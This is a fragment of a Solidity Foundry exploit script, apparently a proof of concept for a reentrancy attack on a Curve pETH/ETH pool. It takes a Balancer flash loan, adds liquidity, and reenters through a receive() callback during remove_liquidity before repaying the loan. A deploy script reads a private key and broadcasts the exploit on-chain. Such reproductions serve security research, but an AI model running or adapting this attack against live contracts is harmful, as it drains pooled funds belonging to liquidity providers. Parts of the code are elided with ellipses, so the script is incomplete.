...
contract ContractTest is Test {
    ...
    function receiveFlashLoan(
        ...
        amount[0] = 40 ether;
        amount[1] = 0;
        CurvePool.add_liquidity{value: 40 ether}(amount, 0);

        amount[0] = 0;
        uint256 amountToWithdraw = LP.balanceOf(address(this));
        emit log_named_decimal_uint(
            "Amount to withdraw", LP.balanceOf(address(this)), LP.decimals()
            );
        CurvePool.remove_liquidity(635_053_704_120_583_054, amount); // reentrancy enter point
        nonce++;

        CurvePool.remove_liquidity(amountToWithdraw, amount);
        ...
        WETH.transfer(address(Balancer), 80 ether);
    }

    receive() external payable {
        if (msg.sender == address(CurvePool) && nonce == 0) {
            emit log_named_decimal_uint(
            "Amount of pETH : ", pETH.balanceOf(address(this)), pETH.decimals()
            );
            emit log_named_decimal_uint(
            "Amount of ETH : ",address(this).balance, 18
            );
            uint256[2] memory amount;
            amount[0] = 40 ether;
            amount[1] = 0;
...
contract DeployContractTest is ContractTest {

    function run() public {
        uint privateKey = vm.envUint("DEV_PRIVATE_KEY");
        address myAddress = vm.addr(privateKey);
        console.log("Account : ", myAddress);
        vm.startBroadcast(privateKey);

        //myAdress deploys contract : 
        ContractTest exploiter = new ContractTest();
        //testExploit launching :
        console.log(".....Testing exploit.....");
        exploiter.testExploit();
